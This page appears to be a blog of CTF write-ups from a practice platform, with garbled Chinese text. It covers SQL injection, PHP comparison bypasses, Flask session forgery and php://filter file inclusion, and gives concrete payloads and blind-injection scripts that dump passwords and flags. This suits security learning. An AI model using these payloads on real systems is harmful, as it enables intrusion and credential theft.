<h2 id="SUCTF-2019-EasySQLï¼ˆå †å æ³¨å…¥ï¼‰"><a href="#SUCTF-2019-EasySQLï¼ˆå †å æ³¨å…¥ï¼‰" class="headerlink" title="[SUCTF 2019]EasySQLï¼ˆå †å æ³¨å…¥ï¼‰"></a>[SUCTF 2019]EasySQLï¼ˆå †å æ³¨å…¥ï¼‰</h2><p>è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†ä¾ç„¶å¯ä»¥å †å æ³¨å…¥</p>
<p>æ‰¾åˆ°Flagè¡¨</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823214702265.png" alt="image-20200823214702265"></p>
<p>ä¹‹åå°±ä¸ä¼šåšäº†â€¦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1;set sql_mode&#x3D;pipes_as_concat;</span><br><span class="line">select 1||flag from Flag;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>è¡¥å……ç³»ç»Ÿå˜é‡@@sql_modeï¼šæ˜¯ä¸€ç»„mysqlæ”¯æŒçš„åŸºæœ¬è¯­æ³•åŠæ ¡éªŒè§„åˆ™<br>PIPES_AS_CONCATï¼šå°†â€œ||â€è§†ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥æ“ä½œç¬¦è€Œéæˆ–è¿ç®—ç¬¦ï¼Œä¹Ÿå’Œå­—ç¬¦ä¸²çš„æ‹¼æ¥å‡½æ•°Concatç›¸ç±»ä¼¼</p>
</blockquote>
<p>åŸæœ¬||æ˜¯orçš„æ„æ€ï¼Œè¿™é‡Œæ‹¼æ¥ä¹‹åï¼š</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215540471.png" alt="image-20200823215540471"></p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823215640962.png" alt="image-20200823215640962"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>ç›´æ¥ä¸‡èƒ½å¯†ç ç™»å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823221210961.png" alt="image-20200823221210961"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-LoveSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</h2><p>ç®€å•çš„sqlæ³¨å…¥</p>
<p>ç›´æ¥unionæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#</span><br><span class="line">1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#</span><br><span class="line">1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)#</span><br></pre></td></tr></table></figure>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLï¼ˆè¿‡æ»¤å…³é”®å­—ï¼‰</h2><p>åŒå†™ç»•è¿‡</p>
<p>æŸ¥å…³é”®å­—å¯ä»¥å…ˆselectè¯­å¥è§‚å¯Ÿå“ªäº›è¢«è¿‡æ»¤äº†ã€‚</p>
<p>å…¶ä¸­å…³é”®å­—æœ‰selectï¼Œunionï¼Œorï¼ˆåŒ…æ‹¬information,passwordï¼‰ï¼Œfromï¼Œwhereï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #</span><br><span class="line">&#x2F;&#x2F;b4bsql,geekuser</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">&#x2F;&#x2F;id username password</span><br><span class="line">1&#39; ununionion selselectect  1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #</span><br><span class="line">flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack Worldï¼ˆè¿‡æ»¤å…³é”®å­—å’Œç©ºæ ¼çš„ç›²æ³¨ï¼‰</h2><p>ç®€å•æµ‹è¯•äº†ä¸€ä¸‹</p>
<p>å‘ç°ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œunionã€andã€orä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå¹¶ä¸”å‘ç°åˆ—æœ‰ä¸¤åˆ—ï¼ŒæŠ¥é”™åªå‡ºboolï¼Œäºæ˜¯å°±æƒ³åˆ°æ˜¯ä¸æ˜¯ç›²æ³¨ï¼Œä½†é¦–è¦é—®é¢˜æ˜¯æ€ä¹ˆç»•è¿‡ç©ºæ ¼</p>
<p>ä»¥ä¸‹æœ‰å‡ ç§ç»•ç©ºæ ¼çš„åŠæ³•</p>
<blockquote>
<p>/**/ ï¼ˆï¼‰ %0a `` tab</p>
</blockquote>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨ï¼ˆï¼‰æ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å†™è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)"</span>.format(i,j)</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ‹¿åˆ°flag</span><br><span class="line">flag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125;</span><br></pre></td></tr></table></figure>
<p>ä½†æˆ‘è‡ªå·±å†™çš„è„šæœ¬å¾ˆè¯¡å¼‚ï¼Œæ— æ³•æ£€æµ‹åˆ°-ï¼Œåªèƒ½é€šè¿‡payloadå€’æ¨</p>
<p>æ‰€ä»¥åˆæ¢äº†ä¸€ä¸ªå†™äº†ä¸€ä¸‹,ç”¨asciiå­—ç¬¦æ¥åˆ¤æ–­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)"</span>.format(i,j);</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload,&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Hello"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p>åˆšå†™è„šæœ¬ï¼Œå¯¹å…¶ä¸­åŸç†è¿˜ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œå¸Œæœ›åç»­èƒ½æ·±å…¥å­¦ä¹ py</p>
<h1 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Havefun"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Havefun" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</h2><p>ç›´æ¥çœ‹æºç </p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222031931.png" alt="image-20200823222031931"></p>
<p>æ‹¿flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat&#x3D;dog</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200823222049635.png" alt="image-20200823222049635"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>ä¸»è¦è¯´ä¸€ä¸‹ä¸¤ä¸ªå‡½æ•°</p>
<p><strong>strcmp()</strong></p>
<blockquote>
<p>strcmp()å‡½æ•°åªæœ‰åœ¨ç›¸ç­‰çš„æƒ…å†µä¸‹è¿”å›0ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå®ƒä¼šè¿”å›NULLï¼Œè€Œåˆ¤æ–­ä½¿ç”¨äº†== ï¼Œè€ŒNULL==0æ˜¯bool(true)ï¼Œè¿™æ ·å°±æˆåŠŸç»•è¿‡ã€‚</p>
</blockquote>
<p><strong>is_numeric()</strong></p>
<blockquote>
<p>is_numeric() åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ï¼Œä¸ä»…æ£€æŸ¥10è¿›åˆ¶ï¼Œ16è¿›åˆ¶ä¹Ÿå¯ä»¥ã€‚<br>is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼åã€‚æ‰€ä»¥ï¼ŒæŸ¥çœ‹å‡½æ•°å‘ç°è¯¥å‡½æ•°å¯¹äºç¬¬ä¸€ä¸ªç©ºæ ¼å­—ç¬¦ä¼šè·³è¿‡ç©ºæ ¼å­—ç¬¦åˆ¤æ–­ï¼Œæ¥ç€åé¢çš„åˆ¤æ–­ï¼<br>è¯¥å‡½æ•°è¿˜å¯èƒ½é€ æˆsqlæ³¨å…¥ï¼Œä¾‹å¦‚å°†â€˜1 or 1â€™è½¬æ¢ä¸º16è¿›åˆ¶å½¢å¼ï¼Œå†ä¼ å‚ï¼Œå°±å¯ä»¥é€ æˆsqlæ³¨å…¥</p>
</blockquote>
<p>ä¹‹åå°±æ˜¯æ”¹cookieï¼Œpostè¿›passwordå’Œmoney</p>
<p>è¿™é‡Œåˆ¤æ–­moneyç›¸ç­‰ç”¨çš„æ˜¯strcmp()æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡</p>
<h2 id="BJDCTF2020-Easy-MD5ï¼ˆffifdyopï¼‰"><a href="#BJDCTF2020-Easy-MD5ï¼ˆffifdyopï¼‰" class="headerlink" title="[BJDCTF2020]Easy MD5ï¼ˆffifdyopï¼‰"></a>[BJDCTF2020]Easy MD5ï¼ˆ<strong>ffifdyop</strong>ï¼‰</h2><p>å‘äº†å‡ ä¸ªæ•°å­—åæ²¡å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åæŠ“åŒ…ï¼Œçœ‹è§hint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæƒ³è¦ç»•è¿‡çš„è¯è‚¯å®šæ˜¯æ‰¾ä¸‡èƒ½å¯†ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">password&#x3D;&#39;&#39; or &#39;123&#39;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„è¯ç”¨çš„æ˜¯<strong>ffifdyop</strong>MD5åŠ å¯†åä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;or&#39;6Ã‰]â„¢Ã©!r,Ã¹Ã­b</span><br></pre></td></tr></table></figure>
<p>ç¬¦åˆä¸‡èƒ½å¯†ç </p>
<p>è¿›å…¥ä¸‹ä¸€å…³</p>
<p>æºç å¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå¯ä»¥æ‹¿æ•°ç»„è¿‡ï¼Œä¹Ÿå¯ä»¥æ‰¾ä¸€äº›ç‰¹æ®Šçš„å¦‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure>
<p>ä»–ä»¬çš„MD5éƒ½æ˜¯0</p>
<p>æœ€åä¸€å…³æºç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥æ‹¿æ•°ç»„ç»•è¿‡å°±å¥½</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200903205415553.png" alt="image-20200903205415553"></p>
<h3 id><a href="#" class="headerlink" title=" "></a> </h3><h1 id="å¼€å‘"><a href="#å¼€å‘" class="headerlink" title="å¼€å‘"></a>å¼€å‘</h1><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>å­¦ä¹ ä¸€ä¸‹tornado</p>
<p><a href="https://blog.csdn.net/belalds/article/details/80575755" target="_blank" rel="noopener">https://blog.csdn.net/belalds/article/details/80575755</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""ä¸»è·¯ç”±å¤„ç†ç±»"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""å¯¹åº”httpçš„getè¯·æ±‚æ–¹å¼"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>
<ol>
<li>tornado.web</li>
</ol>
<p>tornadoçš„åŸºç¡€webæ¡†æ¶æ¨¡å—</p>
<ul>
<li><strong>RequestHandler</strong></li>
</ul>
<p>å°è£…äº†å¯¹åº”ä¸€ä¸ªè¯·æ±‚çš„æ‰€æœ‰ä¿¡æ¯å’Œæ–¹æ³•ï¼Œwrite(å“åº”ä¿¡æ¯)å°±æ˜¯å†™å“åº”ä¿¡æ¯çš„ä¸€ä¸ªæ–¹æ³•ï¼›å¯¹åº”æ¯ä¸€ç§httpè¯·æ±‚æ–¹å¼ï¼ˆgetã€postç­‰ï¼‰ï¼ŒæŠŠå¯¹åº”çš„å¤„ç†é€»è¾‘å†™è¿›åŒåçš„æˆå‘˜æ–¹æ³•ä¸­ï¼ˆå¦‚å¯¹åº”getè¯·æ±‚æ–¹å¼ï¼Œå°±å°†å¯¹åº”çš„å¤„ç†é€»è¾‘å†™åœ¨get()æ–¹æ³•ä¸­ï¼‰ï¼Œå½“æ²¡æœ‰å¯¹åº”è¯·æ±‚æ–¹å¼çš„æˆå‘˜æ–¹æ³•æ—¶ï¼Œä¼šè¿”å›â€œ<strong>405: Method Not Allowed</strong>â€é”™è¯¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexHandler</span><span class="params">(tornado.web.RequestHandler)</span>:</span></span><br><span class="line">    <span class="string">"""ä¸»è·¯ç”±å¤„ç†ç±»"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self)</span>:</span>  <span class="comment"># æˆ‘ä»¬ä¿®æ”¹äº†è¿™é‡Œ</span></span><br><span class="line">        <span class="string">"""å¯¹åº”httpçš„postè¯·æ±‚æ–¹å¼"""</span></span><br><span class="line">        self.write(<span class="string">"Hello Itcast!"</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">        (<span class="string">r"/"</span>, IndexHandler),</span><br><span class="line">    ])</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Application</strong></li>
</ul>
<p>Tornado Webæ¡†æ¶çš„æ ¸å¿ƒåº”ç”¨ç±»ï¼Œæ˜¯ä¸æœåŠ¡å™¨å¯¹æ¥çš„æ¥å£ï¼Œé‡Œé¢ä¿å­˜äº†è·¯ç”±ä¿¡æ¯è¡¨ï¼Œå…¶åˆå§‹åŒ–æ¥æ”¶çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ä¸€ä¸ªè·¯ç”±ä¿¡æ¯æ˜ å°„å…ƒç»„çš„åˆ—è¡¨ï¼›å…¶listen(ç«¯å£)æ–¹æ³•ç”¨æ¥åˆ›å»ºä¸€ä¸ªhttpæœåŠ¡å™¨å®ä¾‹ï¼Œå¹¶ç»‘å®šåˆ°ç»™å®šç«¯å£ï¼ˆ<strong>æ³¨æ„ï¼šæ­¤æ—¶æœåŠ¡å™¨å¹¶æœªå¼€å¯ç›‘å¬</strong>ï¼‰ã€‚</p>
<p><strong>æ€»ç»“Tornado Webç¨‹åºç¼–å†™æ€è·¯</strong></p>
<ol>
<li>åˆ›å»ºwebåº”ç”¨å®ä¾‹å¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªåˆå§‹åŒ–å‚æ•°ä¸ºè·¯ç”±æ˜ å°„åˆ—è¡¨ã€‚</li>
<li>å®šä¹‰å®ç°è·¯ç”±æ˜ å°„åˆ—è¡¨ä¸­çš„handlerç±»ã€‚</li>
<li>åˆ›å»ºæœåŠ¡å™¨å®ä¾‹ï¼Œç»‘å®šæœåŠ¡å™¨ç«¯å£ã€‚</li>
<li>å¯åŠ¨å½“å‰çº¿ç¨‹çš„IOLoopã€‚</li>
</ol>
<h2 id="HCTF-2018-adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰"><a href="#HCTF-2018-adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰" class="headerlink" title="[HCTF 2018]adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰"></a>[HCTF 2018]adminï¼ˆflaskä¸­sessionä¼ªé€ ï¼‰</h2><p>å‘ç°åªèƒ½adminæ‰èƒ½ç™»å½•è·å–flag</p>
<p>ä¸»è¦å­¦ä¹ ä¸€ä¸‹flaskä¸­çš„sessionä¼ªé€ </p>
<p><strong>sessionä¸€èˆ¬å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼Œè€Œåœ¨flaskä¸­ï¼Œsessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œå¹¶ä¸”flaskä¸­å¯¹æ•°æ®ä»…ä»…è¿›è¡Œäº†ç­¾åï¼Œç­¾åä¸»è¦ç›®çš„æ˜¯é˜²æ­¢ç¯¡æ”¹ï¼Œä½†å´æ— æ³•é˜²æ­¢è¢«è¯»å–ã€‚æ‰€ä»¥å°±ä¼šäº§ç”Ÿä¸€äº›å®‰å…¨é—®é¢˜ã€‚</strong></p>
<p>åœ¨è¿™ä¸ªé¢˜ä¸­ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªæ¥è§£é¢˜</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸‹è‡ªå·±æ³¨å†Œç”¨æˆ·testçš„cookieï¼Œä¹‹åè¿›è¡Œè§£ç ï¼Œå¯ä»¥å‚è€ƒpç‰›çš„è„šæœ¬ï¼Œä¹Ÿå¯ä»¥ä¸Šgithubä¸Šæ‰¾flask-session-managerä¹‹ådoneä¸‹æ¥</p>
<p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯python2.7</p>
<p>è§£å¯†:<code>python flask_session_manager2.py decode -c -s # -cæ˜¯flask cookieé‡Œçš„sessionå€¼ -så‚æ•°æ˜¯SECRET_KEY</code><br> åŠ å¯†:<code>python flask_session_manager2.py encode -s -t # -så‚æ•°æ˜¯SECRET_KEY -tå‚æ•°æ˜¯sessionçš„å‚ç…§æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯sessionè§£å¯†åçš„æ ¼å¼</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU</span><br><span class="line">&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs</span><br></pre></td></tr></table></figure>
<p>ä¹‹åè¿›è¡Œæ”¹å¯†ç ç™»å½•å°±å¯ä»¥ã€‚</p>
<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret</h2><p>ä¸€ç›´æŸ¥çœ‹æºç æœ€ååªéœ€è¦ç”¨ä¸€ä¸ªæ–‡ä»¶åŒ…å«å°±å¯ä»¥è¯»å‡ºflag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;xxx.php</span><br><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>[ACTF2020 æ–°ç”Ÿèµ›]Include</h2><p>ç›´æ¥è¯»å–flag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
